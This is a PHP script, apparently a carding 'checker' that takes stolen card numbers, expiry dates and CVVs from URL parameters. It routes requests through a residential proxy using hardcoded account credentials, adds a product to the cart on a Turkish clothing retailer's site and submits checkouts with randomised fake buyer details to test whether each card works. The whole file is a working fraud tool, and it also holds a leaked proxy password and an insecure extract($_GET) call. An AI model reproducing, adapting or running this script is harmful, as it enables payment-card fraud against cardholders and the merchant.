<?php

$username = 'lum-customer-hl_fc2ac923-zone-static';
$password = 'rp569cx13xns';
$port = 22225;
$session = mt_rand();
$super_proxy = 'zproxy.lum-superproxy.io';
$curl = curl_init('http://lumtest.com/myip.json');
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_PROXY, "http://$super_proxy:$port");
curl_setopt($curl, CURLOPT_PROXYUSERPWD, "$username-country-tr-session-$session:$password");
$result = curl_exec($curl);
curl_close($curl);
if ($result)
	$result;

error_reporting(0);
set_time_limit(0);

if (file_exists(getcwd() . '/cookie.txt')) {
	unlink(getcwd() . '/cookie.txt');
}

extract($_GET);
$lista = str_replace(array(":", ";", ",", "|", "�", "/", "\\", " "), "|", $lista);
$lista = str_replace(array("||", "|||"), "|", $lista);
$lista = str_replace(array("||", "|||"), "|", $lista);
$lista = str_replace(array("||", "|||"), "|", $lista);
$lista = str_replace(array("||", "|||"), "|", $lista);
$lista = str_replace(array("|19|"), "|2019|", $lista);
$lista = str_replace(array("|20|"), "|2020|", $lista);
$lista = str_replace(array("|21|"), "|2021|", $lista);
$lista = str_replace(array("|22|"), "|2022|", $lista);
$lista = str_replace(array("|23|"), "|2023|", $lista);
$lista = str_replace(array("|24|"), "|2024|", $lista);
$lista = str_replace(array("|25|"), "|2025|", $lista);
$lista = str_replace(array("|26|"), "|2026|", $lista);
$lista = str_replace(array("|27|"), "|2027|", $lista);
$lista = str_replace(array("|28|"), "|2028|", $lista);
$lista = str_replace(array("|29|"), "|2029|", $lista);
$lista = str_replace(array("|01|"), "|1|", $lista);
$lista = str_replace(array("|02|"), "|2|", $lista);
$lista = str_replace(array("|03|"), "|3|", $lista);
$lista = str_replace(array("|04|"), "|4|", $lista);
$lista = str_replace(array("|05|"), "|5|", $lista);
$lista = str_replace(array("|06|"), "|6|", $lista);
$lista = str_replace(array("|07|"), "|7|", $lista);
$lista = str_replace(array("|08|"), "|8|", $lista);
$lista = str_replace(array("|09|"), "|9|", $lista);
$separa = explode("|", $lista);
$cc = trim($separa[0]);
$mes = trim($separa[1]);
$ano = trim($separa[2]);
$cvv = trim($separa[3]);

function dadossobre()
{
	$sobrenome = file("ad.txt");
	$mysobrenome = rand(0, sizeof($sobrenome) - 1);
	$sobrenome = $sobrenome[$mysobrenome];
	return $sobrenome;
}

function sepet()
{
	$sepet = file("soyad.txt");
	$kaldir = rand(0, sizeof($sepet) - 1);
	$sepet = $sepet[$kaldir];
	return $sepet;
}

function adres()
{
	$adres = file("adres.txt");
	$myadres = rand(0, sizeof($adres) - 1);
	$adres = $adres[$myadres];
	return $adres;
}

function email($nome)
{
	$email = preg_replace('<\W+>', "", "friends") . rand(00000000, 99999999) . "@gmail.com";
	return $email;
}

$email = email($nome);
$sobrenome = dadossobre();
$sepet = sepet();
$adres = adres();

$number1 = substr($cc, 0, 4);
$number2 = substr($cc, 4, 4);
$number3 = substr($cc, 8, 4);
$number4 = substr($cc, 12, 4);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.koton.com/tr/cart/add");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
	'Accept: */*',
	'Connection: keep-alive',
	'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
	'Host: www.koton.com',
	'Origin: https://www.koton.com',
	'Referer: https://www.koton.com/tr/kadin-yazi-baskili-kadin-corap/p/2KAK82100AA601T?productPosition=16&listName=Kad%C4%B1n%20%C3%87orap#tab-1',
	'Sec-Fetch-Mode: cors',
	'Sec-Fetch-Site: same-origin',
	'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36',
	'X-Requested-With: XMLHttpRequest',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'productCodePost=0YAK81206AA000T&qty=1');
$fim = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.koton.com/tr/checkout/single/");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
	'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
	'Connection: keep-alive',
	'Host: www.koton.com',
	'Referer: https://www.koton.com/tr/login/checkout?pageType=CHECKOUT',
	'Sec-Fetch-Mode: navigate',
	'Sec-Fetch-Site: same-origin',
	'Sec-Fetch-User: ?1',
	'Upgrade-Insecure-Requests: 1',
	'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
$fim = curl_exec($ch);

$number1 = substr($cc, 0, 4);
$number2 = substr($cc, 4, 4);
$number3 = substr($cc, 8, 4);
$number4 = substr($cc, 12, 4);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.koton.com/tr/checkout/single");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
	'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
	'Cache-Control: max-age=0',
	'Connection: keep-alive',
	'Content-Type: application/x-www-form-urlencoded',
	'Host: www.koton.com',
	'Origin: https://www.koton.com',
	'Referer: https://www.koton.com/tr/checkout/single/',
	'Sec-Fetch-Mode: navigate',
	'Sec-Fetch-Site: same-origin',
	'Sec-Fetch-User: ?1',
	'Upgrade-Insecure-Requests: 1',
	'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'firstName=' . $sobrenome . '&lastName=' . $sepet . '&email=' . $email . '&deliveryAddress.firstName=' . $sobrenome . '&deliveryAddress.lastName=' . $sepet . '&deliveryAddress.line1=' . $adres . '&deliveryAddress.line2=&deliveryAddress.countryIso=TR&deliveryAddress.townCity=ISTANBUL&deliveryAddress.province=SISLI&deliveryAddress.postcode=34000&deliveryAddress.gsm=0554+222+00+61&invoiceAddress.firstName=' . $sobrenome . '&invoiceAddress.lastName=' . $sepet . '&invoiceAddress.line1=&invoiceAddress.line2=&invoiceAddress.countryIso=TR&invoiceAddress.postcode=&invoiceAddress.gsm=&useEinvoice=false&kotonPaymentForm.nationalId=&kotonPaymentForm.taxPayerId=&useFastDelivery=standardDeliveryRadio&kotonPaymentForm.fastDeliverySlotOption=tomorrow-am&selectShippingCompany=mngRadio&kotonPaymentForm.timeZone=GMT+%2B3&kotonPaymentForm.grossSubTotal=12.99&kotonPaymentForm.creditCard0=' . $number1 . '&kotonPaymentForm.creditCard1=' . $number2 . '&kotonPaymentForm.creditCard2=' . $number3 . '&kotonPaymentForm.creditCard3=' . $number4 . '&kotonPaymentForm.expirationDate%5B0%5D=' . $mes . '&kotonPaymentForm.expirationDate%5B1%5D=' . $ano . '&kotonPaymentForm.cvc2=' . $cvv . '&kotonPaymentForm.installementCount=1&kotonPaymentForm.source=&kotonPaymentForm.policy=on&termsCheckCart=termsValue');
$fim = curl_exec($ch);

$oldMessage = "$proxy";
$deletedFormat = "";

$tarih = date("d.m.Y");

$saat = date("H:i:s");

date_default_timezone_set('Etc/GMT-3');
